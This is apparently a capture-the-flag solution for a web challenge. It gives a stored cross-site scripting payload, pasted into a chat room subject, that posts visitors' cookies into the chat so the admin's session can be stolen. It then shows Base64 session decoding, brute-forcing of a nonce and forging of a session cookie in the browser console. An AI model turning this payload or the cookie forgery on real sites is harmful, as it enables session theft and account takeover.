Solution:

1. Go to http://<server ip>:3000
2. The "Resources" link is just a hint, click on the "Chat" link
3. Click on "Room Subject" and paste in the following:
<script type='text/javascript'>$.post('/chat/msg', {message: document.cookie})</script>
4. Copy the cookie that AdminGuy (or AdminMan) sends into the chat
5. After Base64 decoding the value
e3Nlc3Npb25fdG9rZW46REVBREJFRUYsbm9uY2U6MDA3fQ==
you get
{session_token:DEADBEEF,nonce:007}
6. Go to http://<server>:3000/resources/flag, you get a 403
7. The nonce can be brute forced by sequentially changing the nonce value, re-Base64-encoding the string, adding it to the sess cookie for the "/resources/flag" path, and attempting to connect in a way that there is no referer tag
(This can be accomplished in Chrome Inspector, Firebug, or elsewhere)
8. The correct encoded value is 
e3Nlc3Npb25fdG9rZW46REVBREJFRUYsbm9uY2U6MTM3fQ==
so go into Firebug or Chrome Inspector and enter the following into the console:
document.cookie="sess=e3Nlc3Npb25fdG9rZW46REVBREJFRUYsbm9uY2U6MTM3fQ==; path=/resources/flag"
9. Reload http://<server>:3000/resources/flag and you will have the flag value before you







document.cookie="sess=e3Nlc3Npb25fdG9rZW46MjY2NjA4NTY4QTY1MTczQzAzNEZFRTk1Q0IzNjYwNjI2NzhEMjc3ODIwMDNBMjE0RDdEOThBNTYwNkFFQjk5OTU5MUM4RDRFOTQwOUEzNzFENzNCNjgxQzIyODgxQzhDOTJGODM5MDY4Qjk2RUUzM0FFRkFBQzU2MjI2RTc4Mjc4NTUyNjY4RDRDQTQwNjM3MTY4RkRGOUUyMDQ2RTFDMzk3NTJDQ0IwRkU2NTE3RUQyQzMzQTRBNEU3NTIyRkQ1RjU1REI2RTFGRUJDNkJDNEY3ODM4Mzk1QTBGRUJFRjMyODFGQTA4RDBBODZEQjRGMzRGRTY4QzJGMjRDRDI4QSxub25jZTo1MTN9; path=/resources/flag"

513